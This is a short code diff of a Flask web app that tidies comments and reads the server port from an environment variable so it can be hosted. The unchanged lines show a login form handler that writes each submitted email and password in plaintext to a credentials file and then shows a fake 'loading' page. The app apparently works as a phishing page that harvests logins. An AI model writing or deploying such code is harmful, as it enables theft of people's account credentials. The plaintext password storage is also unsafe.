@@ -4,23 +4,19 @@ app = Flask(__name__)
 
 @app.route("/")
 def index():
-    # Podrías redirigir directamente a /login, o mostrar otra cosa
     return render_template("login.html")
 
 @app.route("/login", methods=["GET", "POST"])
 def login():
     if request.method == "GET":
-        # Mostrar formulario login
         return render_template("login.html")
 
-    # Procesar POST login
     email = request.form["email"]
     password = request.form["password"]
     
     with open("credentials.txt", "a") as f:
         f.write(f"LOGIN - {email}:{password}\n")
     
-    # Mostrar pantalla de "Cargando..." (éste es el template que veremos abajo)
     return render_template("success.html")
 
 @app.route("/registro")
@@ -37,6 +33,8 @@ def register():
     
     return render_template("success.html")
 
-
+# Este bloque permite que Gunicorn cargue la app correctamente
 if __name__ == "__main__":
-    app.run(host="0.0.0.0", port=80)
+    import os
+    port = int(os.environ.get("PORT", 5000))
+    app.run(host="0.0.0.0", port=port)
